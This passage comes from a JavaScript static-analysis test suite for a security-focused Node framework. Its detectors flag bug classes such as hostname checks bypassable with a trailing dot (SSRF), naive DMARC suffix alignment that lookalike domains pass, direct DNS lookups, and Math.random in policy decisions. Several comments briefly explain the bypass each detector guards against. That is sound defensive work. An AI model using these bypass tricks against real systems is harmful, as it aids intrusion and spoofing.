    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      var m = line.match(/\b(_?[a-zA-Z]*(?:Rank|Level)[A-Za-z]*)\s*\([^)]+\)\s*(>=|<=|>|<)\s*\1\s*\(/);
      if (!m) continue;
      var preludeStart = Math.max(0, li - 12);
      var prelude = lines.slice(preludeStart, li).join("\n");
      var hasValidityCheck =
        /\bisValid[A-Za-z]*\s*\(/.test(prelude) ||
        /\bKNOWN_[A-Z_]+\s*\[/.test(prelude) ||
        /\b_isValid[A-Za-z]*\s*\(/.test(prelude) ||
        /\.indexOf\s*\([^)]+\)\s*===\s*-1\b[\s\S]{0,80}?return\s+false/.test(prelude) ||
        /\b[A-Z][A-Z_]*_VOCAB\b/.test(prelude) ||
        /\b[A-Z][A-Z_]*_BANDS?\b/.test(prelude) ||
        /\bif\s*\(\s*![\s\S]{0,80}?\)\s*return\s+false\s*;/.test(prelude);
      if (hasValidityCheck) continue;
      bad.push({
        file:    rel,
        line:    li + 1,
        content: "rank/level compare `" + m[0].trim() + "` without preceding `isValid*` / membership check — unknown inputs map to default rank and falsely pass (fal.meets bug class)",
      });
    }
  }
  bad = _filterMarkers(bad, "enum-rank-without-validation");
  _report("enum rank/level comparison must validate both inputs against known vocabulary first (fal.meets bug class — unknown inputs map to default rank and 0 >= 0 falsely passes)",
    bad);
}

// ---- Pattern: boolean directive flag flipped to false by qualified arg ----
//
// `out[X] = (val === true || val === "" || val === "true")` flips
// the flag to false when val is a NON-EMPTY string (the RFC 9111
// §5.2.2.4 / §5.2.2.6 qualified-form `private="Authorization"` /
// `no-cache="Set-Cookie"`). Presence of the directive SHOULD enable
// it; the argument narrows scope, not the verdict.
//
// Surfaced 2026-05-11 — `b.cdnCacheControl.parse` had this exact
// shape.
function testNoBoolStringCoerceShape() {
  // class: bool-string-coerce-shape
  var matches = _scan(/===\s*""\s*\|\|\s*[A-Za-z_$][\w$]*\s*===\s*"true"/);
  matches = _filterMarkers(matches, "bool-string-coerce-shape");
  _report("boolean directive presence-check must NOT coerce via `val === \"\" || val === \"true\"` — qualified-form arguments (RFC 9111 §5.2.2.4 / §5.2.2.6 `private=\"X\"`) flip the flag to false. Presence == enabled; surface the argument on a separate field map.",
    matches);
}

// ---- Pattern: bare .split() on RFC header value that allows quoted-string fields ----
//
// A file parses HTTP / email header value via `.split(",")` (or
// `.split(";")`) and ALSO contains an sf-string unquote regex shape
// — meaning the parser KNOWS its values can be quoted strings but
// doesn't respect quoted-comma boundaries during the split.
// RFC 8941 §3.3.3 + RFC 9110 §5.5 quoted-string values legitimately
// contain commas inside quotes (e.g. `private="Authorization,
// Cookie"`); a bare split produces fake list members and corrupts
// the parse output.
//
// Surfaced 2026-05-11 — `b.cdnCacheControl.parse` did this.
function testNoBareCommaSplitOnQuotedHeader() {
  // class: bare-split-on-quoted-header
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/cdn-cache-control.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    if (!/\\\\"|replace\s*\(\s*\/\\\\"/.test(content)) continue;
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      if (!/\.split\(\s*["'][,;]["']\s*\)/.test(line)) continue;
      bad.push({
        file:    rel,
        line:    li + 1,
        content: "bare `.split()` on a header value whose grammar allows quoted-string members — quoted commas/semicolons inside quotes will split the list. Use a quote-aware top-level splitter that tracks inQuote + escape state.",
      });
    }
  }
  bad = _filterMarkers(bad, "bare-split-on-quoted-header");
  _report("RFC structured-fields parser must use quote-aware top-level splitter, not bare `.split(\",\") / .split(\";\")` (RFC 8941 §3.3.3 quoted-string values can contain delimiter chars — cdn-cache-control.parse bug class)",
    bad);
}

// ---- Pattern: opts.tenantScope without create-time `.check` validation ----
//
// A primitive accepts an `opts.tenantScope` parameter (a
// `b.agent.tenant.create()` instance) but doesn't validate its shape
// at create() time. If an operator passes a malformed scope, the
// later `tenantScope.check(...)` throw lands in the cross-tenant
// catch branch and refuses every auth — a configuration error
// surfaces as a hard-to-diagnose auth outage. Surfaced by Codex on
// v0.10.12 PR #99 for `b.mail.server.pop3`. The fix shape:
//
//   if (opts.tenantScope && typeof opts.tenantScope.check !== "function") {
//     throw new ErrorClass("module/bad-tenant-scope",
//       "create: opts.tenantScope must be a b.agent.tenant.create() instance");
//   }
//
// Detector: any module that reads `opts.tenantScope` AND wraps a
// call to `tenantScope.check(...)` in try/catch SHOULD have a shape
// validation earlier (typeof opts.tenantScope.check check) so a bad
// scope surfaces at create() time, not at first auth.
function testTenantScopeShapeValidated() {
  // class: tenant-scope-shape-not-validated
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    // Only fires when the file BOTH reads `opts.tenantScope` AND
    // wraps `tenantScope.check` in try/catch (the dangerous pattern).
    if (!/opts\.tenantScope/.test(content)) continue;
    if (!/try\s*\{[\s\S]{0,200}tenantScope\.check\s*\(/.test(content)) continue;
    // Acceptable: the file validates `typeof opts.tenantScope.check`
    // at create() time.
    if (/typeof\s+opts\.tenantScope\.check\s*!==\s*["']function["']/.test(content)) continue;
    if (/typeof\s+tenantScope\.check\s*!==\s*["']function["']/.test(content)) continue;
    var m = content.match(/opts\.tenantScope/);
    var lineNum = content.slice(0, m.index).split("\n").length;
    bad.push({
      file:    rel,
      line:    lineNum,
      content: "opts.tenantScope accepted + tenantScope.check wrapped in try/catch, but `typeof opts.tenantScope.check !== \"function\"` shape validation missing at create() time — a malformed scope would refuse every auth as cross-tenant instead of surfacing as a configuration error (b.mail.server.pop3 v0.10.12 finding)",
    });
  }
  bad = _filterMarkers(bad, "tenant-scope-shape-not-validated");
  _report("opts.tenantScope acceptors that catch tenantScope.check() throws MUST validate the scope's .check shape at create() time so a malformed scope doesn't masquerade as cross-tenant refusal across every auth",
    bad);
}

// ---- Pattern: bCrypto.fromBase64Url on adversarial input outside try/catch ----
//
// A primitive accepts operator-supplied compact-form bytes (JWE, JWT,
// signed blob) and decodes via `bCrypto.fromBase64Url(parts[N])`
// WITHOUT wrapping the call in a typed try/catch. Malformed bytes
// throw raw TypeError from the underlying buffer parser instead of
// the module's coded refusal class. Surfaced by Codex on v0.10.10
// PR #97 for `b.jose.jwe.experimental.decrypt` (line 162).
//
// The detector fires on direct `bCrypto.fromBase64Url(parts[N])` /
// `.fromBase64Url(arr[i])` / `.fromBase64Url(input)` calls in modules
// that decode operator-supplied compact-form input AND don't have a
// `try {` line within 5 lines above the call. Files known to operate
// only on framework-internal already-validated inputs are allowlisted.
function testFromBase64UrlUntrappedOnAdversarialInput() {
  // class: from-base64url-untrapped
  var files = _libFiles();
  var bad = [];
  var ALLOWLISTED_INTERNAL = {
    "lib/crypto.js":              "vendor-data signed-bundle verify path; bytes already gated by ML-DSA verify upstream",
    "lib/audit-sign.js":          "internal-state signature; framework-internal bytes",
    "lib/audit.js":               "internal audit-checkpoint signature verify",
    "lib/vendor-data.js":         "framework-internal manifest signature verify",
    "lib/safe-buffer.js":         "the safe-buffer module itself wraps the primitives",
  };
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (ALLOWLISTED_INTERNAL[rel]) continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li += 1) {
      if (!/\.fromBase64Url\s*\(/.test(lines[li])) continue;
      // Allow inline marker.
      if (/allow:from-base64url-untrapped/.test(lines[li])) continue;
      if (li > 0 && /allow:from-base64url-untrapped/.test(lines[li - 1])) continue;
      // `try {` on the same line wraps this call inline.
      if (/\btry\s*\{/.test(lines[li])) continue;
      // Look back 5 lines for `try {`. If found, this call is wrapped.
      var hasTryAbove = false;
      for (var lb = Math.max(0, li - 5); lb < li; lb += 1) {
        if (/\btry\s*\{/.test(lines[lb])) { hasTryAbove = true; break; }
      }
      if (hasTryAbove) continue;
      // Acceptable when the surrounding function-line carries an
      // explicit allow-via-comment marker or when the call is part of
      // a non-adversarial pipeline (the file is allowlisted above).
      bad.push({
        file:    rel,
        line:    li + 1,
        content: "bCrypto.fromBase64Url(operator-supplied bytes) without surrounding try/catch — malformed input throws raw TypeError instead of the module's coded refusal class. Wrap in try/catch and surface a typed framework error per the module's err namespace (jose-jwe-experimental.decrypt v0.10.10 finding)",
      });
    }
  }
  bad = _filterMarkers(bad, "from-base64url-untrapped");
  _report("`bCrypto.fromBase64Url(operator-input)` must run inside try/catch — malformed compact-form bytes shouldn't surface as raw TypeError outside the module's typed error class",
    bad);
}

// ---- Pattern: hostname string-equality compare with no trailing-dot normalize ----
//
// A file compares a parsed hostname against a reserved-name set
// (`localhost`, `ip6-localhost`, ...) via `===` WITHOUT first
// stripping the trailing root-zone dot. RFC 1034 §3.1 — `foo.` is the
// absolute form of `foo`. An attacker who appends a dot bypasses the
// gate. Surfaced by Codex on v0.10.7 PR #90 for
// `b.guardListUnsubscribe._isRefusedAutoFetchHost`.
function testHostnameCompareTrailingDotNormalize() {
  // class: hostname-compare-trailing-dot
  var files = _libFiles();
  var bad = [];
  var reservedHostLiteralRe = /===\s*"(localhost|localhost\.localdomain|ip6-localhost|ip6-loopback)"/;
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    if (!reservedHostLiteralRe.test(content)) continue;
    var hasStrip = /\.charAt\([^)]*length\s*-\s*1\)\s*===\s*"\."/.test(content) ||
                   /while[\s\S]{0,80}length\s*>\s*0[\s\S]{0,80}charAt[\s\S]{0,80}===\s*"\."/.test(content) ||
                   // end-anchored regex strip of one-or-more trailing dots:
                   // .replace(/\.$/, ...) / .replace(/\.+$/, ...) / .replace(/\.*$/, ...)
                   /\.replace\(\s*\/\\\.[+*]?\$\//.test(content);
    if (hasStrip) continue;
    var m = content.match(reservedHostLiteralRe);
    var lineNum = content.slice(0, m.index).split("\n").length;
    bad.push({
      file:    rel,
      line:    lineNum,
      content: "hostname compared against reserved-name set without trailing-dot normalize — `localhost.` resolves to the same target as `localhost` (RFC 1034 §3.1); strip trailing dots BEFORE the equality check or attackers bypass the gate by appending a dot",
    });
  }
  bad = _filterMarkers(bad, "hostname-compare-trailing-dot");
  _report("reserved-hostname string-equality compare must strip trailing root-zone dot first (RFC 1034 §3.1; SSRF gate bypass class — guard-list-unsubscribe v0.10.7 finding)",
    bad);
}

// ---- Pattern: Date.UTC() result trusted without calendar round-trip ----
//
// `Date.UTC(year, month, day, ...)` silently normalises impossible
// calendar dates (`Feb 31 2026` → `Mar 3 2026`); using the returned
// timestamp without round-tripping through `new Date(ms)` and verifying
// each field matches lets malformed inputs masquerade as valid.
// Surfaced by Codex on v0.10.7 PR #90 for
// `b.mail.server.imap._parseImapDateTime`.
function testDateUtcRoundTripVerify() {
  // class: date-utc-round-trip
  //
  // Only flag the risky shape: `Date.UTC(...)` called with arguments
  // that include a `parseInt(...)` or `Number(...)` parse — those
  // unfailingly come from operator-untrusted string input that
  // Date.UTC will silently normalize. Trusted-input Date.UTC (e.g.
  // composing from already-validated integer fields or from a
  // `new Date().getUTC*` reflection) doesn't fire.
  var files = _libFiles();
  var bad = [];
  var dateUtcPattern = /\bDate\.UTC\s*\(([^)]*)\)/g;
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var fileHasRoundTrip = /new\s+Date\s*\([^)]+\)\s*\.getUTC/.test(content) ||
                           /\.getUTC(?:FullYear|Month|Date|Hours|Minutes|Seconds)\s*\(\)/.test(content);
    if (fileHasRoundTrip) continue;
    dateUtcPattern.lastIndex = 0;
    var dm;
    while ((dm = dateUtcPattern[Symbol.for ? "exec" : "exec"](content)) !== null) {
      var args = dm[1];
      // Only the parsed-untrusted-input shape gets flagged.
      if (!/parseInt\s*\(/.test(args) && !/Number\s*\(/.test(args)) continue;
      var lineNum = content.slice(0, dm.index).split("\n").length;
      bad.push({
        file:    rel,
        line:    lineNum,
        content: "Date.UTC(...) called with parseInt / Number arguments AND file has no calendar round-trip — Date.UTC silently normalises impossible dates (Feb 31 → Mar 3); construct `var probe = new Date(utcMs); if (probe.getUTCMonth() !== month || probe.getUTCDate() !== day) return null;` before trusting the timestamp (mail-server-imap._parseImapDateTime v0.10.7 finding)",
      });
    }
  }
  bad = _filterMarkers(bad, "date-utc-round-trip");
  _report("`Date.UTC(parseInt(...))` outputs must round-trip via `new Date(ms).getUTC*()` field-match before trust — silent calendar normalization makes impossible dates indistinguishable from valid ones",
    bad);
}

// ---- Pattern: info/context-label wrapper branching on undefined/null only ----
//
// A wrapper that prepends a label to an HPKE / KDF / signature `info`
// parameter branches on `info === undefined || info === null` to
// decide whether to skip the prepend. An empty string / empty buffer
// takes the prepend branch, which means `seal({})` (no info) and
// `open({ info: "" })` (explicit empty) produce different derived
// keys — equivalent caller inputs that can't round-trip. Surfaced by
// Codex on v0.10.10 PR #97 for `b.crypto.hpke.pq._prependLabel`.
function testInfoLabelEmptyVsOmitted() {
  // class: info-label-empty-omit-mismatch
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var m = content.match(/info\s*===\s*(undefined|null)\s*\|\|\s*info\s*===\s*(undefined|null)/);
    if (!m) continue;
    var hasEmptyCheck = /info[A-Za-z]*\.length\s*===\s*0/.test(content) ||
                        /info[A-Za-z]*\.length\s*<\s*1/.test(content) ||
                        /infoBytes\.length\s*===\s*0/.test(content);
    if (hasEmptyCheck) continue;
    var lineNum = content.slice(0, m.index).split("\n").length;
    bad.push({
      file:    rel,
      line:    lineNum,
      content: "info/context wrapper branches on `info === undefined || info === null` without ALSO handling empty-string/empty-buffer — RFC 9180 §5.1 treats omitted and empty info as equivalent; `seal({})` and `open({ info: \"\" })` must produce the same derived key (crypto-hpke-pq v0.10.10 finding)",
    });
  }
  bad = _filterMarkers(bad, "info-label-empty-omit-mismatch");
  _report("HPKE / KDF context-label wrappers must treat empty info equivalent to omitted info — `===` undef/null branch without empty-check breaks RFC 9180 §5.1 input-equivalence",
    bad);
}

// ---- Pattern: scoped-context binding (e.g. SRS forwarder domain) not verified ----
//
// A `create({ forwarderDomain })` / `create({ realm })` /
// `create({ origin })` factory binds an instance to a specific
// SCOPED CONTEXT. A later `reverse()` / `verify()` accepts a tagged
// value and verifies the HMAC / signature but never checks that
// the value's embedded context matches the rewriter's binding.
//
// Surfaced 2026-05-11 — `b.mail.srs.reverse` verified the HMAC but
// didn't compare the SRS0 address's `@domain` part against the
// rewriter's `forwarderDomain`.
function testScopedContextBindingUsed() {
  // class: scoped-context-binding-unused
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var captureRe = /var\s+(\w+(?:Domain|Realm|Origin|Audience|Issuer|Aud|Iss)\w*)\s*=\s*opts\.\w+(?:Domain|Realm|Origin|Audience|Issuer|Aud|Iss)\w*(?:\.toLowerCase\(\))?\s*;/g;
    var capm;
    var captures = [];
    while ((capm = captureRe.exec(content)) !== null) captures.push(capm[1]);
    if (captures.length === 0) continue;
    var hasVerifyFn = /function\s+(reverse|verify|decode|parseToken)\s*\(/.test(content);
    if (!hasVerifyFn) continue;
    for (var ci = 0; ci < captures.length; ci++) {
      var name = captures[ci];
      var useRe = new RegExp("\\b" + name + "\\b\\s*(?:!==|===|!=|==|\\.localeCompare\\b)|(?:!==|===|!=|==)\\s*" + name + "\\b");
      if (useRe.test(content)) continue;
      var lines = content.split(/\r?\n/);
      var hitLine = 0;
      for (var li2 = 0; li2 < lines.length; li2++) {
        if (lines[li2].indexOf("var " + name) !== -1) { hitLine = li2 + 1; break; }
      }
      bad.push({
        file:    rel,
        line:    hitLine || 1,
        content: "scope-named opt `" + name + "` captured at factory time but never compared against any inbound value — verify / reverse / decode paths may accept tags scoped to a DIFFERENT context (SRS forwarder-domain bug class)",
      });
    }
  }
  bad = _filterMarkers(bad, "scoped-context-binding-unused");
  _report("scope-named factory bindings (domain / realm / origin / audience / issuer) must be compared against the inbound value's embedded scope in the verify / reverse path (SRS forwarder-domain bug class)",
    bad);
}

// ---- Pattern: DNS lookup falls back to node:dns instead of safeDns ----
//
// Surfaced 2026-05-15 audit `mail-dkim` / `mail-auth` fell back
// to `require("node:dns/promises").resolveTxt(...)` (and `.reverse` /
// `.resolve4` / `.resolve6`) when no operator-supplied `dnsLookup`
// callback was provided. That path sends plaintext UDP/53 to whatever
// the system resolver is and parses the response without any of
// `b.safeDns`'s caps (RR count, name length, pointer-chain depth,
// CNAME chain). Every downstream DKIM / SPF / DMARC / iprev finding
// inherited that exposure (Kaminsky-class poisoning + parse-side
// amplification).
//
// The framework's DoH-by-default path lives in
// `b.network.dns.resolver` (v0.7.23); mail-* modules MUST route TXT /
// PTR / A / AAAA lookups through a `_safeResolveTxt(qname,
// operatorLookup)` helper that calls the resolver when no operator
// lookup is supplied — never `require("node:dns")` directly. Single
// `require("node:dns")` in any framework module is the smell.
function testNoDirectNodeDnsInMail() {
  // class: mail-direct-node-dns
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    // The transport layer (network-dns / network-dns-resolver) IS where
    // node:dns gets called.
    if (rel === "lib/network-dns.js" || rel === "lib/network-dns-resolver.js") continue;
    // Scope this gate to the mail-auth verification family (DKIM /
    // SPF / DMARC / ARC / iprev). mail-bimi / mail-rbl / mail-helo
    // have their own resolver-composition paths (see opts.resolver
    // in mail-rbl) — adding them here is a separate audit slice.
    if (rel !== "lib/mail-auth.js" && rel !== "lib/mail-dkim.js" &&
        rel !== "lib/mail-arc-sign.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      // Reach-through patterns: `require("node:dns")` or
      // `dnsPromises.resolveTxt / .reverse / .resolve4 / .resolve6`.
      if (/require\(\s*["']node:dns(?:\/promises)?["']\s*\)/.test(line) ||
          /\bdns(?:Module|Promises)?\.(?:resolveTxt|reverse|resolve4|resolve6)\b/.test(line)) {
        bad.push({
          file:    rel,
          line:    li + 1,
          content: "mail-* module reaches `node:dns` directly — route through " +
                   "`_safeResolveTxt` / `_safeReverse` / `_safeResolveA` helper " +
                   "(composes `b.network.dns.resolver`, DoH default-on per " +
                   "v0.7.23). CVE-2008-1447 / CVE-2022-3204.",
        });
      }
    }
  }
  bad = _filterMarkers(bad, "mail-direct-node-dns");
  _report("mail-* DNS lookup must compose b.network.dns.resolver, not node:dns directly (DoH default-on bypass)",
    bad);
}

// ---- Pattern: Math.random() for protocol sampling / disposition rolls ----
//
// Surfaced 2026-05-15 audit DMARC pct sampling
// used Math.random() which (a) is a non-cryptographic PRNG so the
// roll can be predicted by an adversary aware of the receiver's
// Node version, and (b) re-rolls per-call so the SAME message gets
// different verdicts across SMTP retries. The framework requires
// crypto-safe randomness AND, for retry-stable contracts, a
// deterministic per-message key derivation (SHAKE256 over a stable
// key → first 4 bytes → uint32 → modulo). Math.random anywhere
// in protocol-relevant policy decisions is the smell.
function testNoMathRandomInPolicyDecisions() {
  // class: math-random-in-policy
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      if (!/\bMath\.random\s*\(/.test(line)) continue;
      // Sampling / pct / disposition / quota / quarantine — the
      // policy-decision lexicon. A Math.random hit on any of these
      // shapes is the bug class.
      if (/\b(?:pct|sample|disposition|quarantine|quota|policy|roll)\b/i.test(line)) {
        bad.push({
          file:    rel,
          line:    li + 1,
          content: "Math.random() used in a policy-decision context " +
                   "(pct/sample/disposition/quarantine/quota/policy/roll) — " +
                   "use crypto.randomInt for hardening floor; SHAKE256 over a " +
                   "stable key for retry-determinism .",
        });
      }
    }
  }
  bad = _filterMarkers(bad, "math-random-in-policy");
  _report("Math.random forbidden in policy-decision contexts — use crypto.randomInt OR SHAKE256(stable-key) per the retry-stability contract ",
    bad);
}

// ---- Pattern: DMARC alignment with naive text-suffix instead of PSL ----
//
// Surfaced 2026-05-15 audit relaxed alignment did a naive
// `endsWith` comparison between From-domain and DKIM/SPF auth-domain.
// `evil-bank.com` text-suffix-aligned with `bank.com` despite being
// separately registered. Use `publicSuffix.organizationalDomain` to
// compare PSL-tail org-domains. The shape "if (X.slice(-Y.length-1)
// === '.' + Y) return true" is the inline form to refuse.
function testNoNaiveSuffixAlignment() {
  // class: naive-suffix-alignment
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/public-suffix.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      // `X.slice(-Y.length - 1) === "." + Y` — the inline text-suffix-
      // align shape. Common in DMARC / DKIM / SPF alignment helpers.
      if (/\.slice\(\s*-\s*\w+\.length\s*-\s*1\s*\)\s*===\s*["']\.["']\s*\+\s*\w+/.test(line) ||
          /\.endsWith\(\s*["']\.["']\s*\+\s*\w+\.toLowerCase\(\)\s*\)/.test(line)) {
        bad.push({
          file:    rel,
          line:    li + 1,
          content: "naive text-suffix alignment — separately-registered " +
                   "confusables (`evil-bank.com` vs `bank.com`) pass. Use " +
                   "`publicSuffix.organizationalDomain(d)` and compare org-" +
                   "domains (RFC 7489 §3.1.1).",
        });
      }
    }
  }
  bad = _filterMarkers(bad, "naive-suffix-alignment");
  _report("relaxed-mode alignment MUST use publicSuffix.organizationalDomain, not naive text-suffix slice (RFC 7489 §3.1.1)",
    bad);
}

// ---- Pattern: gunzip error not distinguishing bomb from corrupt ----
//
// Surfaced 2026-05-15 audit a single error code for "gunzip
// failed" conflates an attacker-supplied decompression bomb (output
// exceeded maxOutputLength) with operator-side corrupt stream. The
// catch must inspect `e.code === "ERR_BUFFER_TOO_LARGE"` /
// `e.code === "ERR_OUT_OF_RANGE"` / message containing "output length
// exceeded" and emit a distinct error so audit can rate-limit the
// source on amplification but not on garbled report uploads.
function testGunzipBombDistinguished() {
  // class: gunzip-bomb-conflated
  // Scoped to mail-auth.js this audit; widen to other consumers when
  // their respective audit slices land. Cheap line-walk instead of
  // multiline regex over whole-file content (which OOMs on large
  // files due to backtracking on `[\s\S]{0,N}?`).
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel !== "lib/mail-auth.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    if (!/\bgunzip(?:Sync)?\b/.test(content)) continue;
    // Distinguished-catch check: BOTH a bomb-named error code AND a
    // failed-named error code in the file body means the catch
    // discriminates.
    var hasBombCode = /-gunzip-bomb\b|gunzip-bomb["']/.test(content);
    var hasFailedCode = /-gunzip-failed\b|gunzip-failed["']/.test(content);
    if (hasBombCode && hasFailedCode) continue;
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      if (/\bgunzipSync\b/.test(lines[li])) {
        bad.push({
          file:    rel,
          line:    li + 1,
          content: "gunzipSync catch must distinguish decompression-bomb " +
                   "(output cap exceeded) from corrupt-stream — emit " +
                   "distinct error codes so audit can rate-limit the " +
                   "source on amplification (CVE-2024 zlib class).",
        });
        break;
      }
    }
  }
  bad = _filterMarkers(bad, "gunzip-bomb-conflated");
  _report("gunzip catch must distinguish bomb (output cap) from corrupt-stream (CVE-2024 zlib amplification class)",
    bad);
}

// ---- Pattern: gitleaks-tripping high-entropy identifier without allowlist ----
//
// CI gitleaks scan flags long camelCase identifier names (e.g.
// `x25519PrivateKey`, `mlkemPrivateKey`) under the generic-api-key
// rule when their Shannon entropy crosses the 3.5+ threshold. The
// framework's public KEM surface uses these names deliberately —
// they're parameter names, not credentials — and we maintain a
// stopword list in `.gitleaks.toml` to suppress the false positive.
//
// This detector runs the same entropy + stopword check LOCALLY so
// the bug surfaces at codebase-patterns time instead of waiting for
// the CI gitleaks gate to fire after push. Scans operator-facing
// files (CHANGELOG, README, SECURITY, MIGRATING, lib/**/*.js JSDoc
// @example blocks) for 20+ char alphanum tokens with entropy >= 3.5;
// each token must be either (a) a stopword in .gitleaks.toml's
// `[[allowlists]]` blocks OR (b) covered by an allowlist regex OR
// (c) preceded by an inline `allow:gitleaks-entropy` marker.
//
// Maintenance: when public surface adds a new high-entropy
// identifier (typically a new KEM keypair primitive), add it to the
// stopwords block in .gitleaks.toml in the same patch as the
// primitive — this detector catches the omission at boot.
function _loadGitleaksAllowlist() {
  var tomlPath = path.resolve(__dirname, "..", "..", ".gitleaks.toml");
  var content;
  try { content = fs.readFileSync(tomlPath, "utf8"); }
  catch (_e) { return { stopwords: [], regexes: [] }; }
  // Line-based parser — a regex-based [\s\S]*? match across the whole
  // file gets confused by `]` chars inside regex literals (e.g.
  // `[A-Za-z0-9_-]+` terminates a naive non-greedy outer match
  // early). Walk lines and track `<key> = [ ... ]` state.
  var stopwords = [];
  var regexes = [];
  var lines = content.split(/\r?\n/);
  var blockKey = null;   // "stopwords" / "regexes" / null
  var blockBody = "";
  for (var i = 0; i < lines.length; i += 1) {
    var line = lines[i];
    if (blockKey === null) {
      var open = line.match(/^\s*(stopwords|regexes)\s*=\s*\[\s*(.*)$/);
      if (!open) continue;
      blockKey = open[1];
      blockBody = open[2] + "\n";
      // Same-line `]` close: `key = [ "x" ]`.
      if (open[2].indexOf("]") !== -1) {
        _flushBlock(blockKey, blockBody.split("]")[0]);
        blockKey = null; blockBody = "";
      }
      continue;
    }
    // Inside a block: append line; close when we see `]`.
    if (/^\s*\]/.test(line)) {
      _flushBlock(blockKey, blockBody);
      blockKey = null;
      blockBody = "";
      continue;
    }
    blockBody += line + "\n";
  }
  function _flushBlock(key, body) {
    // Try triple-quoted FIRST (TOML literal multi-line) before
    // single-quoted, so a `'''...'''` body isn't mis-parsed as two
    // empty single-quoted strings. Then double-quoted basic. Then
    // single-quoted basic. Skip empty captures so a malformed empty
    // string doesn't generate an `/(?:)/`-equivalent regex that
    // matches everything.
    var entryRe = /'''([\s\S]*?)'''|"((?:[^"\\]|\\.)*)"|'([^']*)'/g;
    var em;
    while ((em = entryRe.exec(body)) !== null) {
      var raw = em[1] !== undefined ? em[1] : (em[2] !== undefined ? em[2] : em[3]);
      if (raw === undefined || raw.length === 0) continue;
      if (key === "stopwords") {
        stopwords.push(raw);
      } else if (key === "regexes") {
        try { regexes.push(new RegExp(raw)); } catch (_re) { /* malformed */ }
      }
    }
  }
  return { stopwords: stopwords, regexes: regexes };
}

function _shannonEntropy(s) {
  if (!s || s.length === 0) return 0;
  var counts = Object.create(null);
  for (var i = 0; i < s.length; i += 1) {
    var c = s.charAt(i);
    counts[c] = (counts[c] || 0) + 1;
  }
  var entropy = 0;
  var keys = Object.keys(counts);
  for (var k = 0; k < keys.length; k += 1) {
    var p = counts[keys[k]] / s.length;
    entropy -= p * (Math.log(p) / Math.LN2);
  }
  return entropy;
}

// Curated list of identifier names that have historically tripped CI
// gitleaks (generic-api-key + related rules) at entropy 3.5+. Each
// entry is a public framework parameter / property name that operators
// mention in CHANGELOG / lib JSDoc / examples; gitleaks treats them as
// candidate secrets because of their high entropy + crypto context.
//
// Maintenance: when public surface adds a new high-entropy KEM /
// crypto identifier (typically a parameter from a new keypair
// primitive), append it here AND to .gitleaks.toml's stopwords block
// in the same patch. This detector verifies the two stay in sync:
// every entry below MUST be a stopword in .gitleaks.toml or be
// matched by a regex allowlist there.
//
// Past incidents that prompted entries:
//   v0.7.28 / v0.8.0   — `mlkemPrivateKey` / `x25519PrivateKey`
//                         (ML_KEM_768_X25519 hybrid envelope surface)
//   v0.8.49 / v0.8.50  — same identifier names in @example blocks
//   v0.9.0 fix-up      — bare-identifier form not covered by the
//                         existing bracketed-shape regex
var KNOWN_GITLEAKS_TRIPPING_IDS = Object.freeze([
  "x25519PrivateKey",
  "x25519PublicKey",
  "mlkemPrivateKey",
  "mlkemPublicKey",
]);

function testGitleaksTrippingPatternsAllowlisted() {
  // class: gitleaks-entropy-unallowed
  var allowlist = _loadGitleaksAllowlist();
  var REPO_ROOT = path.resolve(__dirname, "..", "..");
  var bad = [];

  // Part 1 — every curated identifier MUST be in .gitleaks.toml
  // stopwords OR match a regex allowlist. Without this gate, a future
  // refactor that removes the stopword leaves the CI gitleaks scan
  // exposed and operators don't discover until after push.
